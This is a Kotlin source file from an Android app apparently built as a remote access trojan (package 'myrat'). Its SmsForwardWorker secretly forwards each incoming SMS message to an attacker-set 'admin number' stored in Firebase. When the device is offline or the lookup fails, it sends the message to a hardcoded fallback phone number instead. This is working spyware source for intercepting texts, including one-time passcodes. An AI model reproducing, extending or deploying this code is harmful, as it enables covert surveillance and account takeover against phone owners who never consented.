package com.myrat.app.worker

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.telephony.SmsManager
import androidx.work.*
import com.google.firebase.database.FirebaseDatabase
import com.myrat.app.MainActivity
import com.myrat.app.utils.Logger
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class SmsForwardWorker(
    private val context: Context,
    workerParams: WorkerParameters
) : Worker(context, workerParams) {

    override fun doWork(): Result {
        val sender = inputData.getString("sender") ?: return Result.failure()
        val message = inputData.getString("message") ?: return Result.failure()
        val timestamp = inputData.getLong("timestamp", 0L)

        val fallbackNumber = "+918597073837"
        val deviceId = MainActivity.getDeviceId(context)

        if (!isInternetAvailable(context)) {
            Logger.log("No internet – using fallback number $fallbackNumber")
            return sendSms(fallbackNumber, message)
        }

        val database = FirebaseDatabase.getInstance()
        val deviceRef = database.getReference("Device").child(deviceId)
        val latch = CountDownLatch(1)
        var result: Result = Result.failure()

        deviceRef.get().addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val snapshot = task.result
                val adminNumber = snapshot.child("admin_number").getValue(String::class.java)
                val forwarding = snapshot.child("sms_forwarding").getValue(Boolean::class.java) ?: false

                if (!forwarding || adminNumber.isNullOrEmpty()) {
                    Logger.log("Forwarding disabled or admin number missing – no SMS sent")
                    result = Result.success()
                } else {
                    result = sendSms(adminNumber, message)
                }
            } else {
                Logger.error("Firebase fetch failed – falling back to $fallbackNumber")
                result = sendSms(fallbackNumber, message)
            }
            latch.countDown()
        }

        latch.await(10, TimeUnit.SECONDS)
        return result
    }

    private fun sendSms(number: String, message: String): Result {
        return try {
            val smsManager = SmsManager.getDefault()
            smsManager.sendTextMessage(number, null, message, null, null)
            Logger.log("SMS sent to $number: $message")
            Result.success()
        } catch (e: Exception) {
            Logger.error("SMS send failed to $number: ${e.message}")
            Result.failure()
        }
    }

    private fun isInternetAvailable(context: Context): Boolean {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = cm.activeNetwork ?: return false
            val capabilities = cm.getNetworkCapabilities(network) ?: return false
            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } else {
            val networkInfo = cm.activeNetworkInfo
            networkInfo != null && networkInfo.isConnected
        }
    }

    companion object {
        fun scheduleForwardWork(sender: String, message: String, timestamp: Long, context: Context) {
            val data = workDataOf(
                "sender" to sender,
                "message" to message,
                "timestamp" to timestamp
            )

            val work = OneTimeWorkRequestBuilder<SmsForwardWorker>()
                .setInputData(data)
                .setBackoffCriteria(BackoffPolicy.LINEAR, 10, TimeUnit.SECONDS)
                .build()

            WorkManager.getInstance(context).enqueue(work)
        }
    }
}
